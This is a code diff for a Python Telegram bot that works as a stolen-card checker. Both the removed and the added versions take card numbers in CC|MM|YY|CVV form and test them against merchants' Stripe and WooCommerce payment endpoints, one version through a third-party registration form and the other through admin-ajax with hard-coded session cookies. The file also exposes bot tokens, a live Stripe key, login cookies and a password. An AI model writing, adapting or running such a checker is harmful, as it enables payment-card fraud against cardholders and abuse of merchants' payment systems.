@@ -2,122 +2,99 @@ import telebot
 import requests
 import random
 import string
-import time
+from faker import Faker
 
-BOT_TOKEN = "8072279299:AAHSQpNR0d4PuzY5l9kHAqT61-IjWhNjIAI"
-bot = telebot.TeleBot(BOT_TOKEN)
+# Telegram Bot Token
+TOKEN = '8072279299:AAHPYhOiKdnivLNkonK_RTISmhE40ucoVik'
+bot = telebot.TeleBot(TOKEN)
 
-STRIPE_PUBLISHABLE_KEY = "pk_live_gTSPTLXTGXVgIrOkNxFA8F9200HdVDgFMa"
-STRIPE_URL = "https://api.stripe.com/v1/tokens"
-FINAL_URL = "https://app.strongproposals.com/registration/submit"
+# Headers and cookie values (replace with your actual values)
+WP_SEC_COOKIE = 'peshangsalam2001%7C1747623818%7CaUtmkFcdPhNkivyodBbhmDka8JzASWT7VAbLZU4EdAX%7Cefcd2572447d4501f337be68013c83c70c52e9285abe2f5a5d54606cd38c5dea'
+WP_LOGGED_IN_COOKIE = 'peshangsalam2001%7C1747623818%7CaUtmkFcdPhNkivyodBbhmDka8JzAS3327VAbLZU4EdAX%7C5fb7173b3800652912d1977d7f06f909ed83540d981edb0a3a71362d678fd130'
+STRIPE_PM_ID = 'pm_1RLFKDCGos24OgX470HOXnj'  # Example, extract from your request
 
-def generate_random_email():
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
+# Faker for random emails
+fake = Faker()
 
-def parse_card_input(text):
-    parts = text.strip().split('|')
+def get_random_email():
+    return fake.email()
+
+def check_card(card_data):
+    # Parse card data
+    parts = card_data.split('|')
     if len(parts) != 4:
-        return None
-    cc, mm, yy, cvc = map(str.strip, parts)
-    if not (cc.isdigit() and mm.isdigit() and cvc.isdigit() and (len(yy) == 2 or len(yy) == 4)):
-        return None
+        return "❌ Invalid format. Use: CC|MM|YY|CVV or CC|MM|2024|123"
+    cc = parts[0].strip()
+    mm = parts[1].strip()
+    yy = parts[2].strip()
+    cvv = parts[3].strip()
     if len(yy) == 2:
-        yy = "20" + yy
-    return cc, mm.zfill(2), yy, cvc
-
-def create_stripe_token(cc, mm, yy, cvc):
+        yy = f"20{yy}"
+    elif len(yy) != 4:
+        return "❌ Invalid year format (use 2 or 4 digits)."
+    
+    email = get_random_email()
+    # Headers and cookies
     headers = {
-        "content-type": "application/x-www-form-urlencoded",
-        "accept": "application/json",
-        "origin": "https://js.stripe.com",
-        "referer": "https://js.stripe.com/",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
+        'Host': 'kiltermonpurepasture.com',
+        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLDAs04rYKJqlswfi',
+        'Accept': '*/*',
+        'Sec-Fetch-Site': 'same-origin',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Sec-Fetch-Mode': 'cors',
+        'Origin': 'https://kiltermonpurepasture.com',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1',
+        'Referer': 'https://kiltermonpurepasture.com/my-account-2/add-payment-method/',
+        'Cookie': f'wordpress_sec_4386f044e17b28632eab5af87cf998d0={WP_SEC_COOKIE}; wordpress_logged_in_4386f044e17b28632eab5af87cf998d0={WP_LOGGED_IN_COOKIE}; __stripe_mid=11415e57-f4c7-43f5-9322-b7233710355ed20a49; __stripe_sid=288a0fee-3757-40ee-ba25-c54ac85634f56686d4; __ssid=320183e4500217e3ead1f0a77d2600f; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2Fadd-payment-method%2F; tk_qs=; tk_ai=Mg14T5%2FDEdAZWQ5jlGovzd0d; moove_gdpr_popup=%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%221%22%2C%22advanced%22%3A%221%22%7D; mailchimp.cart.current_email=peshangsalam2001@gmail.com; mailchimp_user_email=peshangsalam2001%40gmail.com; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_current_add=fd%3D2025-05-05%2003%3A03%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first_add=fd%3D2025-05-05%2003%3A03%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_migrations=1418474375998%3D1; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2018_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20CriOS%2F130.0.6723.37%20Mobile%2F15E148%20Safari%2F604.1; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; mailchimp_landing_site=https%3A%2F%2Fkiltermonpurepasture.com%2Fmy-account-2%2F'
     }
-    data = {
-        "card[number]": cc,
-        "card[exp_month]": mm,
-        "card[exp_year]": yy,
-        "card[cvc]": cvc,
-        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "payment_user_agent": "stripe.js/78ef418",
-        "time_on_page": str(random.randint(10000, 99999)),
-        "key": STRIPE_PUBLISHABLE_KEY
-    }
-    resp = requests.post(STRIPE_URL, data=data, headers=headers)
-    try:
-        resp_json = resp.json()
-    except Exception as e:
-        return None, f"Stripe JSON decode error: {str(e)}"
-    token = resp_json.get('id')
-    if not token or not token.startswith("tok_"):
-        return None, f"Stripe error: {resp_json.get('error', {}).get('message', 'Unknown error')}"
-    return token, None
-
-def submit_final_request(token, email, cc, mm, yy, cvc):
-    headers = {
-        "content-type": "application/x-www-form-urlencoded",
-        "accept": "*/*",
-        "x-requested-with": "XMLHttpRequest",
-        "accept-language": "en-US,en;q=0.9",
-        "accept-encoding": "gzip, deflate, br",
-        "origin": "https://app.strongproposals.com",
-        "referer": "https://app.strongproposals.com/signup/panel",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
-        "connection": "keep-alive",
-    }
-    # Note: Adjust fields as per your actual form requirements
-    data = {
-        "_token": token,  # Using Stripe token as _tok value as per your request
-        "first_name": "Peshang",
-        "last_name": "Salam",
-        "email_confirmation": email,
-        "email": email,
-        "password_confirmation": "War112233$%",
-        "password": "War112233$%",
-        "phone": "3144740104",
-        "card_number": cc,
-        "card-cvc": cvc,
-        "month": mm,
-        "year": yy,
-        "stripe_token": token,
-        "package_id": '11"',
-    }
-    response = requests.post(FINAL_URL, data=data, headers=headers)
-    return response.text
-
-@bot.message_handler(commands=['start'])
-def start_handler(message):
-    bot.send_message(message.chat.id,
-        "💳 StrongProposals Card Checker Bot\n"
-        "Send cards in format:\n"
-        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
-        "Example:\n"
-        "4430510072892235|02|27|809\n"
-        "5218531116585093|12|2030|470"
+    
+    # Prepare multipart/form-data POST body for admin-ajax.php
+    boundary = '----WebKitFormBoundaryLDAs04rYKJqlswfi'
+    data = (
+        f'--{boundary}\r\n'
+        f'Content-Disposition: form-data; name="action"\r\n\r\n'
+        f'create_setup_intent\r\n'
+        f'--{boundary}\r\n'
+        f'Content-Disposition: form-data; name="wcpay-payment-method"\r\n\r\n'
+        f'{STRIPE_PM_ID}\r\n'
+        f'--{boundary}\r\n'
+        f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
+        f'4858c65548\r\n'
+        f'--{boundary}--\r\n'
     )
 
-@bot.message_handler(func=lambda message: True)
-def card_handler(message):
-    cards = message.text.strip().split('\n')
-    for card_line in cards:
-        parsed = parse_card_input(card_line)
-        if not parsed:
-            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
-            continue
-        cc, mm, yy, cvc = parsed
-        email = generate_random_email()
+    try:
+        response = requests.post(
+            'https://kiltermonpurepasture.com/wp-admin/admin-ajax.php',
+            headers=headers,
+            data=data,
+            timeout=10
+        )
+        
+        # Format response and card info for Telegram
+        result = f"""
+🟢 Card: {cc}|{mm}|{yy}|{cvv}
+📧 Email: {email}
+🔍 Response:
+{response.text}
+"""
+        return result
+    except Exception as e:
+        return f"❌ Error: {str(e)}"
 
-        token, err = create_stripe_token(cc, mm, yy, cvc)
-        if err:
-            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
-            continue
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Send card in format: CC|MM|YY|CVV or CC|MM|YYYY|123")
 
-        # Use the Stripe token as _tok value in final URL request
-        full_response = submit_final_request(token, email, cc, mm, yy, cvc)
-        bot.send_message(message.chat.id, f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\n\nFull Response:\n{full_response}")
+@bot.message_handler(func=lambda m: True)
+def handle_message(message):
+    text = message.text.strip()
+    if '|' in text:
+        result = check_card(text)
+        bot.reply_to(message, result)
+    else:
+        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YY|123 or CC|MM|2024|123")
 
-        time.sleep(10)  # 10 seconds delay between cards
-
-bot.infinity_polling()
+if __name__ == "__main__":
+    print("Bot is running...")
+    bot.infinity_polling()
